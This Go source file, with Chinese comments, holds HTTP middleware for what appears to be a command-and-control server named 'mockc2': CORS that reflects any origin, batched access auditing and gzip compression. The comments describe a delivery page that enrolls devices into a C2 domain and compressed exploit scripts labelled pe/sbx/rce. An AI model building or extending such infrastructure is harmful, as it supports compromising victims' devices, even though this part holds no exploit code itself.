package server

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"mockc2/internal/store"
)

// ── 全链路访问审计中间件 ──
//
// 域角色按 Host 头判定（单域名部署：交付域 = test.dhropjayk57qg3g.lat）。
var hostRole = map[string]string{
	"test.dhropjayk57qg3g.lat": "delivery",
}

func roleFor(host string) string {
	if host == "" {
		return "other"
	}
	h := host
	if i := strings.IndexByte(h, ':'); i >= 0 {
		h = h[:i]
	}
	h = strings.ToLower(h)
	if r, ok := hostRole[h]; ok {
		return r
	}
	if h == "localhost" || h == "127.0.0.1" {
		return "delivery"
	}
	return "other-ip"
}

// ── CORS / OPTIONS 预检 ──
//
// 交付链跨域形态：boot.html 由交付域下发，却 POST 到 C2 域 /api/ip-sync/sync，
// 浏览器/WebView 会先发 OPTIONS 预检。缺 CORS 头 → 预检失败 → POST 不发出 →
// 设备不入库。这里统一放行预检并回 CORS 头。
func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		h := w.Header()
		origin := r.Header.Get("Origin")
		if origin != "" {
			h.Set("Access-Control-Allow-Origin", origin)
		} else {
			h.Set("Access-Control-Allow-Origin", "*")
		}
		h.Set("Vary", "Origin")
		h.Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		h.Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Ops-Token, X-Requested-With")
		h.Set("Access-Control-Max-Age", "600")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

type statusRecorder struct {
	http.ResponseWriter
	status int
	wrote  bool
}

func (s *statusRecorder) WriteHeader(code int) {
	if !s.wrote {
		s.status = code
		s.wrote = true
	}
	s.ResponseWriter.WriteHeader(code)
}

func (s *statusRecorder) Write(b []byte) (int, error) {
	if !s.wrote {
		s.status = 200
		s.wrote = true
	}
	return s.ResponseWriter.Write(b)
}

func auditMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		started := time.Now()
		sr := &statusRecorder{ResponseWriter: w, status: 500}
		next.ServeHTTP(sr, r)
		cost := float64(time.Since(started).Microseconds()) / 1000.0
		rec := map[string]any{
			"ts":      nowString(),
			"role":    roleFor(hostHeader(r)),
			"method":  r.Method,
			"path":    r.URL.Path,
			"query":   r.URL.RawQuery,
			"host":    hostHeader(r),
			"client":  clientIP(r),
			"ua":      r.Header.Get("User-Agent"),
			"status":  sr.status,
			"cost_ms": cost,
		}
		enqueueAudit(rec)
	})
}

// ── 异步批量审计：每请求仅入队，后台按批写 JSONL + 单事务入库 ──
//
// 这是高并发主链的关键优化：审计不再阻塞响应（Python 版为每请求同步写盘 + 单条入库）。

const (
	auditChanCap    = 65536
	auditBatchMax   = 1024
	auditFlushEvery = 200 * time.Millisecond
)

var (
	auditCh    chan map[string]any
	auditOnce  sync.Once
	auditDrops int64
)

func initAuditWorker() {
	auditOnce.Do(func() {
		auditCh = make(chan map[string]any, auditChanCap)
		go auditLoop()
	})
}

func enqueueAudit(rec map[string]any) {
	if auditCh == nil {
		// 未初始化（极少见）：退化为同步写
		store.SafeCall(func() {
			store.GetStore().WriteJSONL("access.jsonl", rec)
			store.RecordAccess(rec)
		})
		return
	}
	select {
	case auditCh <- rec:
	default:
		// 队列满：直接丢弃并计数（INC-2026-0929-001 §6.6/§6.8）——
		// 有界内存优先；审计丢失可接受，请求链路阻塞不可接受。
		// 丢弃量经 /__metrics → mockc2_audit_dropped_total 暴露告警。
		atomic.AddInt64(&auditDrops, 1)
	}
}

// AuditDroppedTotal 审计队列满丢弃条数（/__metrics 暴露）。
func AuditDroppedTotal() int64 { return atomic.LoadInt64(&auditDrops) }

func auditLoop() {
	ticker := time.NewTicker(auditFlushEvery)
	defer ticker.Stop()
	batch := make([]map[string]any, 0, auditBatchMax)
	flush := func() {
		if len(batch) == 0 {
			return
		}
		lines := make([][]byte, 0, len(batch))
		for _, rec := range batch {
			if b, err := json.Marshal(rec); err == nil {
				lines = append(lines, b)
			}
		}
		store.SafeCall(func() {
			store.GetStore().WriteJSONLLines("access.jsonl", lines)
			store.RecordAccessBatch(batch)
		})
		batch = batch[:0]
	}
	for {
		select {
		case rec := <-auditCh:
			batch = append(batch, rec)
			if len(batch) >= auditBatchMax {
				flush()
			}
		case <-ticker.C:
			flush()
		}
	}
}

// ── 传输压缩：大静态 JS（pe/sbx/rce）≈ -82% 字节 ──

type gzipResponseWriter struct {
	http.ResponseWriter
	buf         bytes.Buffer
	status      int
	wroteHeader bool
}

func (g *gzipResponseWriter) Header() http.Header { return g.ResponseWriter.Header() }

func (g *gzipResponseWriter) WriteHeader(code int) {
	if !g.wroteHeader {
		g.status = code
		g.wroteHeader = true
	}
}

func (g *gzipResponseWriter) Write(b []byte) (int, error) {
	if !g.wroteHeader {
		g.status = 200
		g.wroteHeader = true
	}
	return g.buf.Write(b)
}

func gzipMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.Contains(r.Header.Get("Accept-Encoding"), "gzip") {
			next.ServeHTTP(w, r)
			return
		}
		gw := &gzipResponseWriter{ResponseWriter: w}
		next.ServeHTTP(gw, r)

		h := w.Header()
		body := gw.buf.Bytes()
		status := gw.status
		if status == 0 {
			status = 200
		}
		if status == http.StatusNoContent || status == http.StatusNotModified {
			w.WriteHeader(status)
			return
		}
		if len(body) >= 2048 && h.Get("Content-Encoding") == "" {
			h.Set("Content-Encoding", "gzip")
			h.Del("Content-Length")
			w.WriteHeader(status)
			gz := gzip.NewWriter(w)
			_, _ = gz.Write(body)
			_ = gz.Close()
			return
		}
		if h.Get("Content-Length") == "" {
			h.Set("Content-Length", strconv.Itoa(len(body)))
		}
		w.WriteHeader(status)
		_, _ = w.Write(body)
	})
}
